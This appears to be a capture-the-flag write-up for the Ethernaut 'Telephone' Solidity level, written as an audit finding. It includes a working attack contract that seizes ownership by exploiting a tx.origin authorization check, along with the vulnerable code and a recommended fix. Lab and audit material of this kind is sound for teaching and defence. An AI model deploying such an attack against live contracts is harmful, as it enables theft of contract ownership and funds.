#### Claim ownership of the contract below to complete this level.

## Summary
The `Telephone::changeOwner` function gives ownership of the contract. The only required condition is `tx.origin != msg.sender` which can be easily bypassed.

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

## Vulnerability Detail
The only required condition is `tx.origin != msg.sender` in the `Telephone::changeOwner` functon can be easily bypassed.

The deployed malicious contract:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ITelephone.sol";

contract TelephoneAttack {
    address public telephoneAddress;

    constructor(address _telephoneAddress) {
        telephoneAddress = _telephoneAddress;
    }

    function changeOwnerToAttackerAddress() public {
        ITelephone telephoneContract = ITelephone(telephoneAddress);

        telephoneContract.changeOwner(msg.sender);
    }
}
```

Attack scenario:
1. An attacker deploys a malicious contract `TelephoneAttack` which has an `changeOwnerToAttackerAddress()` function. 
2. The attacker calls the `changeOwnerToAttackerAddress()` function. The function itself calls the `changeOwner()` function and updates the owner of the `Telephone` contract to be the attacker.
3. The condition `tx.origin != msg.sender` is bypassed easily, since the tx.origin is not the msg.sender now.
4. The attacker is now the new owner of the contract and do whatever they want.

## Impact
High. This breaks a core contract functionality. The attacker can become the owner of the contract and can do whatever they want without any constraints.

## Code Snippet
https://github.com/danielvichinyan/ethernaut-solutions/blob/main/telephone/Telephone.sol#L12-L14

## Tools Used
Remix IDE, Manual Review

## Recommendation
Avoid using `tx.origin` for authorization. Always use `msg.sender`.
Consider using OpenZeppelin's `Ownable`.
